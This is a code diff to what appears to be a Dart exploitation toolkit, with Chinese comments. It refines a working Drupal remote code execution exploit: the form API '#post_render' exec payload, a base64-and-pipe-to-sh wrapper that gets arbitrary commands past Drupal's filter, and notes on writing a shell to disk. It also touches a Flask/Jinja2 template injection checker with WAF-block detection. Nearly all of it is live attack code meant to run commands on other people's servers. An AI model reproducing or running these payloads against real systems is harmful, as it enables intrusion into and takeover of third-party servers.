@@ -1,6 +1,7 @@
 import 'dart:convert';
 
 import '../../../app/constants.dart';
+import '../../core/exploit_error.dart';
 import '../../../core/http/http_client.dart';
 import '../../../core/http/http_result.dart';
 import 'exp_result.dart';
@@ -86,12 +87,15 @@ class DrupalExpService {
   Future<ExpResult> check() async {
     // 用唯一标记验证命令确实被执行；旧实现只要 200 且含 '[' 就判定存在，
     // 任何 Drupal AJAX 端点都会命中，属于误报。
-    final marker = 'MXDRUPAL_${DateTime.now().millisecondsSinceEpoch}';
+    final ts = DateTime.now().millisecondsSinceEpoch;
+    final marker = 'MXDRUPAL_$ts';
     try {
       final payload =
           'form_id=user_register_form&_drupal_ajax=1'
           '&mail[#post_render][]=exec&mail[#type]=markup'
-          '&mail[#markup]=printf%20$marker';
+          // printf 的格式串与参数分开发：请求里出现的是 "MXDRUPAL_%s <ts>"，
+          // 只有真的执行了才拼出 "MXDRUPAL_<ts>"，回显请求骗不过去。
+          '&mail[#markup]=printf%20MXDRUPAL_%25s%20$ts';
       final res = await _httpClient.postOrThrow(
         '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
@@ -134,7 +138,11 @@ class DrupalExpService {
     if (trimmed.contains('base64')) {
       return trimmed;
     }
-    return '$trimmed | base64 | tr -d "\\n"';
+    // 实测踩过的坑：`#markup` 会过 Drupal 的 XSS 过滤器，`&&` 被转成 `&amp;&amp;`，
+    // 于是 `test -w x && echo ok` 这类命令在 shell 里变成两个无意义片段 → exec 恒为 null、
+    // shell 落盘全失败。把命令整体 base64 后交给 sh，markup 里就只剩安全字符。
+    final b64 = base64Encode(utf8.encode(trimmed));
+    return '(echo $b64 | base64 -d | sh) | base64 | tr -d "\\n"';
   }
 
   Future<String?> execRce(String cmd) async {
@@ -147,7 +155,18 @@ class DrupalExpService {
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         body: payload,
       );
-      final out = _parseOutput(res.body ?? '');
+      final body = res.body ?? '';
+      final lower = body.toLowerCase();
+      // 实测：未安装的 Drupal 会对一切返回安装向导/跳转页，
+      // 旧实现把 "Redirecting to /core/install.php" 当成命令输出返回。
+      if (lower.contains('core/install.php') ||
+          lower.contains('redirecting to') ||
+          lower.contains('drupal installation')) {
+        throw const ExploitNotWorking(
+          'Drupal 尚未完成安装（被重定向到安装向导），命令没有执行',
+        );
+      }
+      final out = _parseOutput(body);
       if (out == null || out.isEmpty) return null;
       // 先尝试把执行结果当 base64 解码，还原原始输出。失败则返回原串。
       try {
@@ -156,6 +175,10 @@ class DrupalExpService {
       } catch (_) {
         return out;
       }
+    } on ExploitNotWorking {
+      rethrow;
+    } on ExploitBlocked {
+      rethrow;
     } catch (_) {
       return null;
     }
@@ -236,6 +259,8 @@ class FlaskSstiExpService {
   Future<ExpResult> check() async {
     try {
       final res = await _send('{{233*233}}');
+      final blocked = wafBlockedResult('Flask/Jinja2 SSTI', res.statusCode, res.body);
+      if (blocked != null) return blocked;
       if ((res.body ?? '').contains('54289')) {
         return ExpResult(
           true,
